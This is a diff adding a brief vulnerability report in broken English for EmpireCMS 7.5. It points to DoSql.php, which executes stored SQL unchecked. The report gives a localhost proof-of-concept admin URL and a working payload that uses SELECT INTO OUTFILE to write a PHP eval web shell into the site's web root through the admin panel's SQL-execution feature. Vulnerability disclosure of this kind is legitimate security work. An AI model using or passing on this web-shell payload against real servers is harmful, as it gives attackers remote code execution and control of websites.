@@ -1,0 +1,48 @@
+
+#CVE          
+
+#EmpireCMS 7.5:
+
+The vulnerability was discovered by downloading the program's source code to local and online deployment tests.      
+
+Location:        
+\e\admin\db\DoSql.php  
+
+Code：      
+$r=$empire->fetch1("select sqltext from {$dbtbpre}enewssql where id='$id'");
+	if(!$r['sqltext'])
+	{
+		printerror('EmptyExecSqlid','');
+    }
+	$query=RepSqlTbpre($r['sqltext']);
+	DoRunQuery($query);       
+
+Rows:143       
+Direct query.  
+
+Harm：       
+Get server permissions     
+
+Conditions for Execution：      
+Normal access can    
+
+Edition：     
+all versions of EmpireCMS    
+
+Cause the cause ：           
+\e\admin\db\DoSql.php lines 143:
+$r=$empire->fetch1("select sqltext from {$dbtbpre}enewssql where id='$id'");
+	if(!$r['sqltext'])
+	{
+		printerror('EmptyExecSqlid','');
+    }
+	$query=RepSqlTbpre($r['sqltext']);
+	DoRunQuery($query);  
+Direct query. Did not check for sensitive functions
+
+POC :      
+http://127.0.0.2:8080/e/admin/admin.php?ehash_ZggST=fK6I2xSKLEmuO6qZXF9A
+At system - backup and restore data - execute SQL statement
+
+payload：
+select '<?php @eval($_POST[1])?>' into outfile 'D:/wwwroot/diguocms/1.php'
